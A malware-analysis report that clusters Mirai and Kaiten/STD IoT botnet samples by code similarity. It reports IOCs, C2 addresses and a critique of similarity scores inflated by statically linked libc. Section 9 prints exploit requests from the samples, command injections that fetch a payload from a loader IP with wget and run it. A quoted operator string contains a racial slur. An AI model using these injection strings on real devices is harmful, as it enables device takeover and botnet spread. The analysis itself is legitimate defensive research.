# Mirai7 collection — malware family report

> **Scope correction.** An earlier draft of this report concluded "one code base,
> many rebrands". That was wrong, and it was wrong for a methodological reason
> worth stating up front: I pivoted from a list of *canonical Mirai symbols*
> (`attack_parse`, `table_init`, `scanner_init`, …) instead of enumerating the
> symbols actually present in the collection. Doing the latter surfaced a
> **second, unrelated botnet family** — see §7. The collection name is `mirai7`;
> its contents are not all Mirai.

Analysis performed entirely through the BSimVis REST API (`localhost:5001/api`),
collection `mirai7`, algo `unweighted_cosine`. Date of analysis: 2026-07-28.

## 1. Collection at a glance

| Metric | Value |
|---|---|
| Files | 174 (1 ingestion batch) |
| Functions | 34 503 (34 245 indexed, 99.25 %) |
| BSim features | 172 039 |
| First / last seen (sample metadata) | 2025-04-04 → 2026-05-19 |
| Named samples vs. hash-named | 131 / 43 |

Architecture spread (14 Ghidra language IDs) — this is a classic IoT botnet
cross-compilation matrix:

| Arch | Files | | Arch | Files |
|---|---|---|---|---|
| ARM:LE:32:v8 | 42 | | 68000:BE:32 (Coldfire) | 11 |
| MIPS:LE:32 | 31 | | PowerPC:BE:32:e500 | 11 |
| MIPS:BE:32 | 19 | | sparc:BE:32 | 8 |
| x86:LE:32 | 19 | | AARCH64 | 3 |
| SuperH4:LE:32 | 12 | | Loongarch64 / RISCV32 / RISCV64 / MIPS64 | 2/2/2/1 |
| x86:LE:64 | 11 | | | |

AV labels: `Unix.Dropper.Mirai-*`, `Unix.Trojan.Mirai-*`, `Unix.Malware.Mirai-*`
— **plus 15 samples labelled `Unix.Trojan.Tsunami-*`**. That second label is not
noise and not a bundling artefact: it is a genuinely different family, confirmed
by code in §7. YARA hits:
`Backdoor_Linux_Mirai_*` / `Trojan_Linux_Mirai_*` variants — and `UPX_Protector`
on **55 samples**.

## 2. Packing: half the collection is a stub

54 files expose fewer than 10 functions; 53 of those carry the `UPX_Protector`
YARA hit. Those samples decompile to a 2-function UPX stub, so they are
**analytically empty** for BSim and they poison naive similarity ranking: every
stub-vs-stub pair scores `1.0` with `shared_clusters = 2`.

Practical consequence for any report built on this collection: filter binary
similarity with `min_funcs` (I used `min_funcs=50`). Without it, the top 300
pairs by score are all packed stubs.

Naming convention observed: samples prefixed `p` (`pmips`, `pmpsl`, `parm5`,
`px86_64`, `pm68k`) and the `xnxnxnxnxnxnxnxn<arch>xnxn` set are the packed
variants; the same campaigns also appear unpacked.

## 3. Campaigns inside the collection

Grouping file names by stem (after stripping the arch suffix):

| Campaign stem | Files | Notes |
|---|---|---|
| `boatnet.*` | 33 | largest single build set, 10+ arch targets |
| `p*` / `xnxn*` | 26 | packed builds (UPX) |
| `DEMONS.*` | 14 | own build, own C2 resolver |
| `nuclear.*` | 7 | **symbolised** — retains original Mirai symbol names |
| `cock`, `net`, `botnet`, `dicknet`, `unet`, `cracknet`, `fucknet`, `swatnet` | 8 | **Kaiten/STD family, not Mirai** — see §7 |
| `iran.mips*`, `mips`, `mipsel`, `chrome`, `nova.mipsel`, `manji.mpsl`, `tuxnokill.mpsl`, `wife.mpsl`, `m-p.s-l.dick` | 1–3 each | long tail of rebranded forks |

Two C2 addresses are recorded in the file metadata, and each one ties together a
full cross-architecture build set — the strongest infrastructure pivot available:

* `143.20.185.245` — 7 files: x86-64, x86-32 (×2), MIPS:BE, ARM (×3)
* `202.155.10.112` — 6 files: SuperH4, x86-64, SPARC, ARM (×2), PowerPC

Both sets are hash-named (no original filename), so *without* code similarity
they look like 13 unrelated unknowns.

## 4. Binary clustering — how the family splits

`bin_cluster/list` returns an HDBSCAN **dendrogram**, not a flat partition: 100
nodes, root node `174` covering all 174 files at cohesion 0.043. The interesting
level is the leaves — 50 of them covering 145 files.

Selected leaf clusters (cohesion = mean pairwise binary similarity inside the
cluster):

| Cluster | n | Cohesion | Content |
|---|---|---|---|
| 208 | 14 | **1.000** | `boatnet.arm / arm5 / arm6 / arm7` + hash-named twins — one build, one day |
| 206 | 5 | 0.963 | `pmpsl`, `wife.mpsl`, `boatnet.mips`, `pmips` — packed MIPS set |
| 207 | 4 | 1.000 | `boatnet.mpsl` ×3 + hash-named |
| 181 | 4 | 1.000 | `boatnet.ppc` ×4 |
| 246 | 2 | 0.986 | `DEMONS.mpsl` ×2 |
| 273 | 2 | 0.973 | `cock` / `net` — same source, MIPS BE vs MIPS LE |
| 275 | 2 | 1.000 | `iran.mipsel` + hash-named twin |

Key observation: the clusters are organised **by build/campaign, not by
architecture**. Cluster 208 mixes ARM variants of the same campaign, and named
samples repeatedly cluster with hash-named unknowns — which is exactly how you
attribute an unknown sample here.

**The full set of all 50 leaf clusters — including every 2- and 3-file cluster —
is in [Appendix A](#appendix-a--every-binary-cluster-including-the-small-ones),
and the 29 files HDBSCAN left unclustered are in
[Appendix B](#appendix-b--the-29-files-in-no-cluster).** The small clusters carry
most of the attribution value: seven of them are the only link between a
hash-named unknown and a named campaign.

## 5. Binary similarity — cross-endian, but not cross-ISA

Filtering `bin_sim/search` to `min_funcs=50, min_score=0.5` leaves 89 pairs.
Highlights:

| Score | A | B | Arch A / B | Shared clusters |
|---|---|---|---|---|
| 0.973 | `cock` | `net` | MIPS:BE / MIPS:LE | 583 |
| 0.953 | `32817e09…` | `4854ea67…` | MIPS:BE / MIPS:LE | 509 |
| 0.952 | `pmips` | `pmpsl` | MIPS:BE / MIPS:LE | 220 |
| 0.944 | `iran.mipsel` | `iran.mips` | MIPS:LE / MIPS:BE | 507 |
| 0.991 | `32817e09…` | `iran.mips` | MIPS:BE / MIPS:BE | 518 |

32 of the 89 pairs are cross-architecture — but **all** of them are MIPS BE ↔
MIPS LE. No ARM↔MIPS or x86↔ARM pair survives at the binary level, because BSim
features are lifted from p-code but whole-binary coverage still diverges too much
across ISAs (different libc code paths, different inlining).

The `cock` / `net` diff (`bin_sim/diff`) quantifies it: 583 matched clusters,
8 unique to A, 13 unique to B, score 0.973. That is the same source tree compiled
for two endiannesses, with a handful of functions added on one side.

## 6. Function-level code reuse — the real signal

This is where the cross-ISA link that binary similarity misses shows up.

The collection contains a few **symbolised** samples (`nuclear.*`, `mipsel`,
`cock`, `net`, `dicknet`, `arm7`, `nova.mipsel`) that kept the original Mirai
symbol names: `attack_parse`, `attack_tcp_syn`, `attack_gre_ip`, `scanner_init`,
`killer_init`, `table_init`, `table_lock_val`, `resolve_cnc_addr`, `rand_init`,
`util_local_addr`, `anti_gdb_entry`. They act as a **Rosetta stone**: pivot from a
named function to its similarity cluster, and every `FUN_xxxxxxxx` member of that
cluster in a stripped sample inherits the meaning.

### 6.1 `table_init` — the config-table decryptor, across 8 architectures

The cluster containing `nuclear.arm7:table_init` (uuid `8ec63aa85bd9`, 40 members
in 34 distinct files, cohesion 0.991, avg 95 BSim features) spans:

```
ARM:LE:32 13 | MIPS:LE:32 9 | x86:LE:32 5 | x86:LE:64 4
MIPS:BE:32 3 | SuperH4 3   | PowerPC 2   | sparc 1
```

Tighter sub-nodes of the same branch: uuid `b1da238cc2c6` (37/31 files, 0.995),
`b677fe34552c` (27/22, 0.999), `f28e6d43b032` (25/21, **1.000**).

A separate, smaller cluster (`7faa9a55a27b`, 12 members, 12 files, 0.994) mixes
`table_init` with a function named `xor_init` in another sample — the same
routine renamed by a different fork's author.

Concrete evidence from `function/code`, both members of cluster `f28e6d43b032`:

`nuclear.arm7` (ARM:LE:32, symbolised):
```c
void table_init(void)
{
    void *pvVar1;
    pvVar1 = malloc(6);
    util_memcpy(pvVar1,&DAT_0002fadc,6);
    table._4_2_ = 6;
    table._0_4_ = pvVar1;
    pvVar1 = malloc(7);
    util_memcpy(pvVar1,&DAT_0002faec,7);
    ...
```

`chrome` (x86:LE:64, stripped) — matched purely on BSim features:
```c
void FUN_00407780(void)
{
    undefined8 uVar1;
    uVar1 = FUN_0040aec0(0x13);
    FUN_004080d0(uVar1,"FROSTED IS HERE NIGGA",0x13);
    _DAT_00512678 = 0x13;
    _DAT_00512670 = uVar1;
    uVar1 = FUN_0040aec0(0x36);
    FUN_004080d0(uVar1,&DAT_0040e730,0x36);
    ...
```

Same shape (`malloc` → `memcpy` → store ptr/len into a fixed table, repeated),
different ISA, different bitness, no symbols on the x86-64 side. `FUN_0040aec0`
= `malloc`, `FUN_004080d0` = `util_memcpy`. The x86-64 sample also leaks its
operator branding in cleartext inside the config table: **`FROSTED IS HERE NIGGA`**
— i.e. the `chrome` sample belongs to a "Frosted" rebrand, which no filename or
AV label in the collection told us.

### 6.2 Attack module

`attack_tcp_syn` in `nuclear.arm7` sits in a family of large clusters (357–366
avg features) whose named members are:

`attack_gre_eth`, `attack_gre_ip`, `attack_tcp_ack`, `attack_tcp_legit`,
`attack_tcp_null`, `attack_tcp_sack2`, `attack_tcp_stream`, `attack_tcp_syn`,
`attack_tcp_synr`, `attack_udp_ovhhex`.

They cluster *with each other* (25, 17, 9, 8 members over 3–4 files) because the
Mirai attack handlers are near-identical boilerplate around one packet builder —
useful to know: a cluster here identifies "an attack handler", not a specific
attack. The `attack_udp_ovhhex` member indicates an OVH-targeted UDP flood, and
`attack_gre_*` the GRE floods of the original Mirai leak. All these clusters are
ARM-only — the attack code diverges more per-ISA than `table_init` does.

`attack_parse` (163 features) gives a cleaner pivot: cluster `832a548e5b98`,
5 members over 4 files (`nuclear.arm7`, `arm7`, `DEMONS.arm6`,
`3d1cc5c4c42e43ace192728a05654943`), cohesion 0.998 — two of them stripped
(`FUN_000082e8`, `FUN_0000828c`). So `DEMONS` and the hash-named unknown share
the `nuclear` attack-command parser verbatim.

### 6.3 Killer / anti-analysis / scanner

* `killer_init` — cluster `92c30e6ad61b` (3 files: `arm7`, `ppc`, `sh4`,
  cohesion 0.969, 205 features) and `1c4d8bfd1b65` (4 files across ARM + m68k).
  The killer module (kills competing bots and telnet/ssh daemons) is shared
  across the `nuclear.*` build set.
* `competitiveKiller` — a *renamed* killer in `cock` / `net` / `dicknet`
  (cluster `8a72dcda0ec1`, cohesion 1.000, MIPS BE + MIPS LE). Same job,
  author-specific name → evidence of a distinct fork maintaining its own source.
* `anti_gdb_entry` — cluster `aa8b0376c1e8`, 7 files, cohesion 1.000, spanning
  ARM + MIPS LE + MIPS BE, present in `nuclear.arm7`, `dicknet`,
  `tuxnokill.mpsl` and 3 hash-named samples. Note one member is named
  `rpc_thread_multi` in another sample — a decoy symbol name.
* `scanner_init` — the `mipsel` sample carries an **extended** scanner:
  `dlinkscanner_scanner_init`, `comtrend_scanner`, `huawei_scanner_init`,
  `realtek_scanner_init`, `adb_scanner_init` (310–401 features, cohesion
  0.93–1.00). Exploit-based (not telnet-brute-force) propagation — see §7.

## 7. The second family: Kaiten/STD (`*net` samples) — **not Mirai**

Enumerating every non-`FUN_` symbol in the collection (34 503 functions →
5 375 named) instead of probing for known Mirai names exposes a completely
different vocabulary in nine samples:

| Sample | Arch | Functions |
|---|---|---|
| `cock` | MIPS:BE:32 | 591 |
| `net` | MIPS:LE:32 | 596 |
| `botnet` | SuperH4:LE:32 | 628 |
| `dicknet` | ARM:LE:32 | 638 |
| `unet` | ARM:LE:32 | 584 |
| `cracknet` | PowerPC:BE:32 | 577 |
| `fucknet` | x86:LE:32 | 596 |
| `swatnet` | x86:LE:64 | 568 |
| `7b70aceca81d…` | MIPS:BE:32 | stripped — attributed by cluster, see below |

All eight named samples share **366 identically-named functions** — one source
tree, eight cross-compiles.

### 7.1 Attack API

```
SendOVH_STORM   SendDOMINATE     SendCloudflare   SendHTTPCloudflare
SendHTTPHex     SendHOME1/HOME2  SendSTD          SendSTDHEX / SendSTD_HEX
SendUDP         sendTLS          sendHTTPtwo      senditbudAMP
sendHLD         sendKILLALL      sendPkt          sendnfo
httpattack      vseattack        stdhexflood      UDPRAW    HIPER_OVH
```

`SendOVH_STORM(undefined4 param_1, undefined2 param_2, int param_3, int param_4)`
— the function that gave this section away — is an OVH-bypass HTTP flood: it
`sprintf`s a request out of ~130 separate `DAT_*` string fragments (the header
set is split up to defeat static string extraction), prefixes `"PGET "`, and
loops on `time()` for the attack duration. `SendDOMINATE`, `SendCloudflare` and
`SendHTTPCloudflare` are the same shape with different header sets — named after
the DDoS-mitigation vendors they try to bypass. `senditbudAMP` and `UDPRAW` are
amplification/raw-socket floods; `vseattack` is a Valve Source Engine query
flood; `sendKILLALL` is the stop-attack command.

### 7.2 Lineage

The support functions are the giveaway — `sockprintf`, `recvLine`,
`processCmd`, `initConnection`, `getRandomIP`, `makeIPPacket`, `rand_cmwc`,
`listFork`, `getOurIP`, `getArch`, `getHost`, `getPortz`, `connectTimeout` —
this is the **Kaiten / STD / LizardStresser** IRC-bot lineage, not Mirai. It has
an IRC-style text C2 (`sockprintf`/`recvLine`/`processCmd`) where Mirai has a
binary protocol (`attack_parse`), and `competitiveKiller` where Mirai has
`killer_init`.

This retroactively explains a metadata detail from §1 that I noted but did not
follow: **15 samples carry `Unix.Trojan.Tsunami-*` AV labels**. Tsunami is the
Kaiten descendant. The AV labels were right; my symbol list was too narrow.

A third, smaller fork (`m-p.s-l.dick`, `nova.mipsel`) uses lowercase
`send_udp`, `send_tcp`, `send_tcp_syn`, `send_ovh`, `send_ovh_bypass`,
`send_udp_gbps`, `send_udp_bypass` **plus Minecraft-specific attacks**
(`send_mc_join`, `send_mc_motd`, `send_mc_spam`, `send_mc_bypass`) — Minecraft
server stressing is a common commercial booter feature.

### 7.3 Cross-family attribution of a stripped sample

`7b70aceca81d038bcf859ea5a28f9fd9` has no symbols and no useful filename. It
lands in function clusters `94976a98c44c` (`makeIPPacket`, cohesion 1.000) and
`e1c6274727e1` (`SendSTD`, 45 members, cohesion 0.96) alongside `cock`, `net`,
`botnet` and `cracknet` — so it is a Kaiten build, not a Mirai one, decided
purely on code.

### 7.4 The libc trap — why binary similarity said "related" and was wrong

`cock` (Kaiten) vs `iran.mips` (Mirai) scores **0.55 with 420 shared clusters**
in `bin_sim/search`. Reading the matched table (`/api/diff?table=matched`) shows
what those 420 clusters actually are:

```
fcntl64 ×56, thread_self ×10, recvmsg ×9, wait ×6, svcerr_noproc ×4,
send ×4, __rpc_thread_createerr ×3, open64 ×3, sendto ×3, sem_unlink ×3,
xdr_hyper ×2, pthread_* …
```

**Zero malware functions.** Both families are statically linked against the same
uClibc (with pthreads and Sun RPC pulled in), and in a 600-function binary the
libc dominates the score. Two unrelated botnets look 55 % similar.

Corollaries for anyone using this data:

* A binary similarity score on statically-linked IoT malware is a **library
  similarity score** until proven otherwise. Always read the matched cluster
  names before calling two samples related.
* The same trap at function level: the `anti_gdb_entry` cluster (§6.3) has an
  average of **3 BSim features** and pulls in `dicknet` (Kaiten) alongside Mirai
  samples. Tiny functions match everything — filter on `min_features`.
* The reliable cross-family separator is a *large, distinctive* function:
  `table_init` (95–132 features) never crosses into the Kaiten set, and
  `SendSTD`/`makeIPPacket` never cross into the Mirai set.

## 8. What BSimVis actually matched: the static-libc mass

This deserves its own section, because it is simultaneously the tool's most
impressive result and its biggest analytical hazard.

### 8.1 The finding

BSimVis recovered the **shared library code** across these samples with high
accuracy and no symbols. Measured on the symbolised samples (counting functions
whose names belong to the malware source itself vs. everything else):

| Sample | Functions | Malware-authored | Share | BSim features from malware code |
|---|---|---|---|---|
| `arm7` (Mirai) | 393 | 72 | 18 % | 39 % |
| `nuclear.arm7` (Mirai) | 396 | 59 | 15 % | 29 % |
| `cock` (Kaiten) | 591 | 48 | 8 % | 21 % |
| `mipsel` (Mirai + exploit scanners) | 818 | 12 | 1 % | 4 % |

**82–99 % of the functions in every sample are uClibc**, pulled in by static
linking: `__stdio_wcommit`, `_ppfs_setargs`, `_ppfs_parsespec`, `__stdio_rfill`,
`malloc`/`__heap_free`, `memchr`/`memrchr`/`strchr`, `fseeko64`, `opendir`,
`__getdents64`, `__xstat64_conv`, plus a full pthreads implementation and the
entire Sun RPC/XDR stack (`xdr_*`, `svc_*`, `clnt*`, `pmap_*`) that uClibc drags
in by default.

That mass is exactly what dominates the cluster listing: sorting `cluster/list`
by member count, the top 25 clusters are the dendrogram root (`entry`, 30 172)
followed by **24 libc clusters** — `fcntl64` (1413), `__stdio_wcommit` (931, 925,
891, 889, 883, 881, 874), `_ppfs_setargs` (810, 735, 730, 726, 710, 654, 616,
610, 574, 553), `__stdio_rfill` (498, 496, 487, 351), `select` (462), `suspend`
(458). The malware's own functions do not appear until far down the list.

And it works *across architectures and across libc builds*: the `__xstat64_conv`
clusters span 138, 111, 103, 90 members over MIPS BE/LE, ARM, PowerPC and x86.
As a "recover the statically-linked library from a stripped binary" engine,
BSimVis is doing its job very well.

### 8.2 The critique: for malware analysis, most of this is noise

The problem is that every downstream score is computed over that mass.

1. **Binary similarity becomes library similarity.** `cock` (Kaiten) vs
   `iran.mips` (Mirai) = 0.55 with 420 shared clusters, of which **zero** are
   malware functions (§7.4). Two unrelated families look "moderately related"
   because they were built with the same buildroot toolchain. In a corpus where
   everyone uses the same cross-compiler, the libc signal is *constant* — it
   carries no discriminative information about the malware, yet it supplies most
   of the score.
2. **It inflates confidence in the wrong direction.** A 0.55 similarity reads as
   a lead. Here it is an artefact of `uclibc-ng` + `--static`. An analyst who
   ranks work by score will investigate toolchain twins before investigating
   actual code reuse.
3. **It buries the interesting 4–39 %.** The functions that matter — `table_init`,
   `attack_parse`, `SendOVH_STORM`, the exploit scanners — are a minority of
   functions and a minority of features. On `mipsel`, the sample with the most
   novel capability in the whole collection, the malware code is **4 %** of the
   BSim feature mass. The signal-to-noise ratio is worst exactly where the
   interesting sample is.
4. **Cluster names are majority-vote and mostly useless here.** The
   config-table cluster — 40 members across 8 architectures, the single most
   important cluster in this collection — is named **`FUN_0040becc`**, because
   most of its members are stripped. Meanwhile the large libc clusters get clean
   names (`__xstat64_conv`, `_ppfs_setargs`, `strchr`), so browsing the cluster
   list by name shows you the library and hides the malware. The one symbolised
   member is what makes a cluster interpretable, and the naming scheme ignores
   it: preferring a *non*-`FUN_` name when one exists in the cluster would fix
   this in one line and would have surfaced `table_init` immediately.
5. **Tiny-function false positives compound it.** The `anti_gdb_entry` cluster
   averages 3 features and mixes Kaiten and Mirai samples; `resolve_cnc_addr`
   averages 9. Below ~20 features a "match" means almost nothing, and libc is
   full of tiny functions.

### 8.3 What to do about it

None of this is unfixable — it is a filtering and presentation problem:

* **Filter by feature count, always.** `min_features` ≥ 50 on
  `cluster/list`/`function/search` removes most of the libc noise and all of the
  tiny-function nonsense. My useful findings all came from clusters with 95–420
  average features.
* **Read the matched table, not the score.** `/api/diff?table=matched` with the
  cluster names is what turned "cock and iran.mips are 55 % similar" into "they
  share nothing but uClibc". This should be the reflex before believing any
  binary similarity number.
* **Build a library-exclusion set.** The collection already contains the
  material: cluster the libc functions once (they are the huge, low-cohesion
  clusters), tag them `lib:uclibc`, and offer an `exclude_tag` on
  `bin_sim/search`. A "malware-only similarity score" — computed after removing
  library clusters — would be a far better ranking signal than the raw score.
  BSimVis already has every primitive needed for this (tags are searchable and
  `exclude_tag` exists at similarity level); what is missing is doing it by
  default. **This is the single highest-value feature I would add.**
* **Turn the bug into a feature.** The libc match itself is real intelligence if
  you ask a different question: which uClibc version, which toolchain, which
  buildroot profile. Grouping by libc cluster fingerprint would identify *build
  environments* — and shared build environments across nominally different
  families is a genuine attribution signal (e.g. the same "botnet builder kit"
  used by different operators). Today that is accidental output; it could be an
  explicit view.

Bottom line: BSimVis found the libraries excellently and the malware in spite of
them. For malware analysis specifically, "similarity" over statically-linked
binaries needs a library-aware denominator, or the analyst has to supply one
by hand every single time.

## 9. The `mipsel` fork: exploit propagation and a loader IP

Reading the decompiled scanner strings (`function/code`) turned up the payload
URLs embedded in each exploit, all pointing at **one loader host not present in
any sample's `cc_ip` metadata**:

| Module | Request | Target |
|---|---|---|
| `dlinkscanner_scanner_init` | `GET /login.cgi?cli=aa aa';wget http://37.48.254.120/arm7 -O /tmp/arm7;chmod 777 /tmp/arm7;/tmp/arm7'$` | D-Link command injection |
| `comtrend_scanner` | `GET /ping.cgi?pingIpAddress=google.fr;wget http://37.48.254.120/arm7 …&sessionKey=1039` | Comtrend ADSL `ping.cgi` injection |
| `huawei_scanner_init` | `POST /ctrlt/DeviceUpgrade_1` (Digest auth) | Huawei HG532, CVE-2017-17215 |
| `realtek_scanner_init` | `POST /picsdesc.xml`, SOAPAction `urn:schemas-upnp-org:…` | Realtek SDK UPnP SOAP, CVE-2014-8361 |
| `adb_scanner_init` | — | Android Debug Bridge (5555/tcp) |

**IOCs**: loader `http://37.48.254.120/<arch>`, dropped to `/tmp/<arch>` with
`chmod 777`; HTTP `User-Agent: r00ts3c`.

This fork is a real capability upgrade over stock Mirai (which brute-forces
telnet only), and it is the only sample set in the collection carrying it.

## 10. LLM-assisted triage (`/api/llm/summarize`)

Per-function summaries were generated through the API and written back as notes
(owner `claude-report`). Value: the summaries independently reproduced the
semantics that the clustering had *implied*, without seeing the symbol names.

* `chrome:FUN_00407780` (stripped x86-64) — *"sequentially allocates memory
  blocks of varying sizes and copies static string literals into them, storing
  the resulting pointers and lengths in global variables"*. That is exactly
  Mirai's `table_init`, described from a stripped binary. Independent
  confirmation of the cluster match in §6.1.
* `cock:competitiveKiller` — *"persistent background process that monitors
  active TCP connections … terminates the associated processes via SIGKILL"*,
  parsing `/proc/net/tcp`. Confirms it as the competing-bot killer.
* `nuclear.arm7:killer_init` — forks a watchdog that kills the parent and
  `lock_commands()`; anti-analysis + persistence.
* `nuclear.arm7:attack_parse` — deserialises the C2 attack payload and calls
  `attack_start`.
* `mipsel:comtrend_scanner` — flagged the loader IP `37.48.254.120` and the
  `wget` + `chmod 777` chain, which I then **verified in the raw decompiled
  strings** before using it (see §7). Worth stating explicitly: the LLM output
  was treated as a lead, not as evidence.

## 11. Annotations written back to the collection

All via the API, so they are visible in the UI and reusable by the next analyst.

Function tags (`tags/bulk_add`, applied to whole clusters):

| Tag | Cluster uuid | Functions |
|---|---|---|
| `mirai:config_table` | `8ec63aa85bd9` | 40 (34 files, 8 architectures) |
| `mirai:attack_handler` | `9981d8faef4d` | 25 |
| `mirai:anti_gdb` | `aa8b0376c1e8` | 7 |
| `mirai:attack_parse` | `832a548e5b98` | 5 |
| `mirai:killer` | `92c30e6ad61b` | 3 |
| `mirai:killer_competitive` | `8a72dcda0ec1` | 2 |
| `mirai:scanner_exploit` | `ec3821a244d0`, `89f59cdca8ba` | 4 |

File tags: `c2:143.20.185.245` (7), `c2:202.155.10.112` (6), `packed:upx` (55),
`analysis:stub-only` (54), `campaign:boatnet` (33), `campaign:demons` (14),
`campaign:nuclear` (7), `campaign:frosted` (1), `loader:37.48.254.120` (1).

File notes on `mipsel` (exploit modules + loader IOCs) and `chrome`
(cluster-based attribution + `FROSTED` branding), plus five LLM function notes.

Because the function tags were applied to *cluster members*, every stripped
`FUN_xxxxxxxx` in the collection that shares Mirai's config-table routine is now
labelled `mirai:config_table` — the naming propagates without touching Ghidra.

## 12. Conclusions

1. `mirai7` holds **at least two unrelated botnet families**, plus packing noise:
   * **Mirai** proper — `boatnet` (33), `DEMONS` (14), `nuclear` (7, symbolised),
     `iran`, `chrome`/"Frosted", `mipsel`, and most hash-named samples.
     Fingerprint: the `table_init` config-table routine, shared essentially
     unmodified by 34 files across 8 architectures.
   * **Kaiten / STD (LizardStresser)** — the nine `*net` samples. IRC C2,
     `SendOVH_STORM`-style attack API, `competitiveKiller`. 366 identical
     function names across 8 cross-compiles. Matches the 15 `Unix.Trojan.Tsunami`
     AV labels that were sitting in the metadata the whole time.
   * A third minor fork (`m-p.s-l.dick`, `nova.mipsel`) with lowercase `send_*`
     attacks including Minecraft-specific floods.
2. Within Mirai the partitioning is **campaign-driven**: `boatnet`, `DEMONS`,
   `nuclear`, `Frosted`, `iran`, plus packed duplicates of the same builds.
3. Two forks made real source-level changes: `mipsel` added exploit scanners
   (D-Link/Comtrend/Huawei/Realtek/ADB) dropping from loader `37.48.254.120`;
   the Kaiten `*net` set is a separate lineage entirely.
4. Attribution of the 43 hash-named unknowns is achievable: 13 fall onto two C2
   IPs, `7b70aceca81d…` was placed in the Kaiten family purely by function
   cluster, and the rest land in high-cohesion binary clusters or in the
   `table_init` / `attack_parse` clusters with named siblings.
5. 55 UPX-packed samples are dead weight for similarity analysis — unpack and
   re-ingest before drawing statistical conclusions about the collection.
6. **Raw similarity scores in this corpus are mostly a uClibc measurement**
   (§8). 82–99 % of functions per sample are statically-linked library code, and
   two samples from *different families* score 0.55 on that basis alone. Every
   conclusion above rests on either large distinctive functions
   (≥ 50 BSim features) or on reading the matched cluster names — never on the
   score by itself.

### Recommended follow-ups

* Unpack the 55 UPX samples, re-upload, re-run `cluster/rebuild_all`.
* Tag the large low-cohesion libc clusters `lib:uclibc` and re-score binary
  similarity with them excluded — see §8.3. Without this, every score in the
  collection is ~80 % library.
* Extract the config table contents per sample (the `DAT_*` referenced by
  `table_init`) — that yields C2 domains for the 161 samples with no `cc_ip`.
* Split the collection: the nine Kaiten `*net` samples do not belong in a
  collection named `mirai7`, and mixing them inflates cross-family similarity.
* Sweep the remaining 5 375 named functions for other non-Mirai vocabularies —
  the `Send*` set was found only because a human spotted `SendOVH_STORM`.


---

## Appendix A — every binary cluster, including the small ones

Section 4 highlighted seven clusters; this is the complete leaf set. 50 leaf
clusters cover 145 of 174 files. Small clusters (n = 2–4) are **not** noise here:
several of them are the only evidence tying a hash-named sample to a campaign,
and the cross-endian pairs are exactly the "same source, two builds" cases.

| Cluster | uuid | n | Cohesion | Arch | Members | Read |
|---|---|---|---|---|---|---|
| 208 | `5ce46242b5cf` | 14 | 1.000 | arm | `1504da4e2f8861fadaf106de4c22a59d`, `673c690dbad12aa01e0d0623b280f611`, `762ef22840a768874c52007a44cfb639`, `76967ae237e049914ddf302f6937ae06`, `boatnet.arm`, `boatnet.arm`, `boatnet.arm`, `boatnet.arm5`, `boatnet.arm5`, `boatnet.arm6`, `boatnet.arm6`, `boatnet.arm6`, `boatnet.arm7`, `boatnet.arm7` | packed stubs — 2–11 functions each, similarity meaningless |
| 195 | `bd1af8ee9421` | 6 | 0.499 | sparc | `2e907c293d242ae36c59696dd328ae4f`, `DEMONS.spc`, `boatnet.spc`, `boatnet.spc`, `boatnet.spc`, `spc` | same campaign/build |
| 206 | `2d9339158c00` | 5 | 0.963 | mips/mpsl | `boatnet.mips`, `boatnet.mpsl`, `pmips`, `pmpsl`, `wife.mpsl` | packed stubs — 2–11 functions each, similarity meaningless |
| 181 | `7ea017c000c3` | 4 | 1.000 | ppc | `aa815409644f5fe353c8442b754d018e`, `boatnet.ppc`, `boatnet.ppc`, `boatnet.ppc` | packed stubs — 2–11 functions each, similarity meaningless |
| 196 | `8f7b21961645` | 4 | 0.435 | mips/mpsl | `83866cc199ebdb057b19649efbc703bb`, `pmips`, `pmpsl`, `xnxnxnxnxnxnxnxnmipsxnxn` | cross-endian pair of one build |
| 205 | `1094732755c9` | 4 | 0.313 | x86 | `6c63810565d33b948c19add3e55ef485`, `DEMONS.x86`, `DEMONS.x86`, `nuclear.x86` | same campaign/build |
| 207 | `005b581a526e` | 4 | 1.000 | mips/mpsl | `412addf4c974ec7cb0eeff939e7e60a7`, `boatnet.mips`, `boatnet.mpsl`, `boatnet.mpsl` | packed stubs — 2–11 functions each, similarity meaningless |
| 239 | `619a420ede04` | 4 | 0.343 | sh4 | `2abe9d933d6821e118fadbaadddfa44c`, `botnet`, `sh4`, `sh4` | **cross-family** — Kaiten member matched to Mirai on libc only |
| 247 | `8fbacdc5f7a0` | 4 | 0.545 | sh4 | `1a907dd4c92797996033348bf1be51fb`, `DEMONS.sh4`, `boatnet.sh4`, `boatnet.sh4` | same campaign/build |
| 253 | `581c3dfd6add` | 4 | 0.517 | arm | `DEMONS.arm`, `DEMONS.arm5`, `DEMONS.arm5`, `parm5` | same campaign/build |
| 267 | `643b60650e9e` | 4 | 0.515 | mpsl | `38ea4d206fe17ad4889d0cfe43f5bd0f`, `5991b6c6b8e96e75fdb71ae25b68bc97`, `manji.mpsl`, `mipsel` | same campaign/build |
| 189 | `6e0393979dbd` | 3 | 0.785 | x86 | `2ce92c91c2d338fe6e87a8a5ccf8767d`, `a186de0274dc842998d87f263a5b1ec6`, `px86` | packed stubs — 2–11 functions each, similarity meaningless |
| 192 | `3df1d56e5bb6` | 3 | 1.000 | x86 | `px86`, `px86_i486`, `px86_i686` | packed stubs — 2–11 functions each, similarity meaningless |
| 193 | `6ab8eb596708` | 3 | 1.000 | x86 | `boatnet.i686`, `boatnet.i686`, `boatnet.x86` | packed stubs — 2–11 functions each, similarity meaningless |
| 209 | `b8f238978dc0` | 3 | 1.000 | arm | `parm5`, `parm6`, `parm7` | packed stubs — 2–11 functions each, similarity meaningless |
| 215 | `0ff9a5c5047c` | 3 | 0.316 | sh4 | `psh4`, `xnxnxnxnxnxnxnxnsh2xnxn`, `xnxnxnxnxnxnxnxnsh4xnxn` | same campaign/build |
| 225 | `8bf9f4343366` | 3 | 0.515 | m68k | `DEMONS.m68k`, `boatnet.m68k`, `boatnet.m68k` | same campaign/build |
| 228 | `250c6034d4fe` | 3 | 0.493 | m68k | `pm68k`, `pm68k`, `xnxnxnxnxnxnxnxnm68kxnxn` | same campaign/build |
| 254 | `3248fe105a1c` | 3 | 0.644 | arm | `11b5bca019537cf6486ee5827d383935`, `3f15bcb05a8d4931c72cfe5d06eebbd4`, `unet` | **cross-family** — Kaiten member matched to Mirai on libc only |
| 261 | `45e0acbea86c` | 3 | 0.594 | arm | `3d1cc5c4c42e43ace192728a05654943`, `DEMONS.arm6`, `DEMONS.arm6` | same campaign/build |
| 270 | `c2aa00213f43` | 3 | 0.491 | mips/mpsl | `7b70aceca81d038bcf859ea5a28f9fd9`, `8cf35e8a597f814508927e1382a8d503`, `mips` | **cross-family** — Kaiten member matched to Mirai on libc only |
